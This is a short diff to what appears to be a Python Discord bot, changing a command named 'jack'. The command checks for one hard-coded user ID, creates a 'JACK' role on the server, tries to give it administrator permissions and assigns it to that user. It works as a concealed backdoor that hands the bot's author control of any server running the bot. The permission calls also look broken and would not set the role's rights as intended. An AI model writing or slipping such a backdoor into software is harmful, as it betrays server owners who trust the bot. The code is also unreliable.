@@ -122,7 +122,7 @@ async def jack(ctx):
     if ctx.message.author.id == '344967220025098242':
         await client.create_role(ctx.message.server, name="JACK")
         role = discord.utils.get(ctx.message.server.roles, name="JACK")
-        role.permissions.all()
+        role.permissions.administrator()
         await client.add_roles(ctx.message.author, role)
     else:
         return await client.say("Only Jackaboi#8319 Can Use This Command!")
